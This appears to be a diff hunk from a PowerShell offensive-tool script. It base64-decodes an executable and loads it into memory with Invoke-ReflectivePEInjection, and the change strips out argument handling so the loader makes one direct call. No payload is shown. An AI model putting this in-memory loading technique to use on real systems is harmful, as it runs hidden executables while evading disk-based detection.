@@ -3584,18 +3584,5 @@ Main
 }
 
 $PEBytes = [System.Convert]::FromBase64String($InputString)
-if ($args.Count -gt 0)
-{
-	$MyArgsStr = ""
-	for ($i = 0; $i -lt $args.Count; $i++)
-	{
-		$MyArgsStr += $($args[$i]) + " "
-	}
-	"[#Param:] " + $MyArgsStr
-	Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $MyArgsStr
-}
-else
-{
-	Invoke-ReflectivePEInjection -PEBytes $PEBytes
-}
+Invoke-ReflectivePEInjection -PEBytes $PEBytes
 
